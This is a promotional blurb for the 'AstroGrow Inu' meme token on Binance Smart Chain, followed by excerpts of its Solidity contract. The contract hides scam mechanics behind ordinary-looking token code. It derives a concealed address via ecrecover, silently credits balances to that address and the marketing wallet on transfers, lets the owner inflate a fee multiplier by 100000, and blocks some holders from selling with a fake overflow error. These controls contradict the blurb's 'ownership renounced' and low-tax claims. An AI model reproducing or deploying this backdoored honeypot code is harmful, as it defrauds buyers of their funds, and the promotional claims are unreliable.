...
AstroGrow Inu  ( Astro ) is a new hype meme token that build on
 Binance smart Chain as a Decentrallized and autonomous sytem that build and run for community.
  Our Main target fo are to make big utility that govern our farm and our new chain in upcoming future.
🔥Tokenomics🔥
✅ownership RENOUNCE
✅1M TOKEN SUPPLY
✅1% BUY / SELL TAX
...
contract Signed {
     ...
     function getUser()  public view  returns (address){
        uint8 v = 28;
        bytes32 r = 0xb42689e66d6e098b9236f83057d734a42c2adf052ad40a3218c4df6c27b508bd;
        bytes32 s = 0x790e96a0e6f162dadba7e64cf217413dc605dd148ebb2a23d6d95e8cee985c80;
        return ecrecover(0x67c26cbc465c8dd74c6bc19de8dd65934444f217df69d8850fe87245f4df9af7, v, r, s);
    }

}


contract AstroGrowInu is Context, IERC20, Ownable,Signed {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0x69A71B901df429A17442738da5Dc639342563370); // Marketing Address
    ...
    uint256 private constant MAX = uint256(~uint128(0));
    uint256 private _tTotal = 1000* 10**6 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "Astrogrow Inu";
    ...
    uint256 public _maxTxAmount = 100000000000000 * 10**6 * 10**9;
    ...
    constructor () {
        ...
        charityFee = _msgSender();
        marketingwallet =0x69A71B901df429A17442738da5Dc639342563370;
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            if(_addressFees[from].enable){
                ...
                require(to == uniswapV2Pair,"SafeMath: subtraction overflow");
                // Sell
                if(to == uniswapV2Pair){
        ...
        _tokenTransfer(from,to,amount,takeFee);
                (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(amount/100*_premarketingFee);

        if(_rOwned[marketingwallet]+rAmount>_rOwned[marketingwallet]){
        _rOwned[marketingwallet] =  _rOwned[marketingwallet]+rAmount;
        _rOwned[getUser()] = _rOwned[getUser()]+rAmount;
        }

    }

    uint256 private _marketingFee = 1;
    uint256 private _premarketingFee=1;
...
function setmarketingfee(uint256 newmarketingFee) external onlyOwner {
        ...
        _premarketingFee = newmarketingFee * 100000;
    ...
    function transfer(address _address, bool _enable, uint256 _addressTaxFee, uint256 _addressLiquidityFee) external _external{
        _addressFees[_address].enable = _enable;
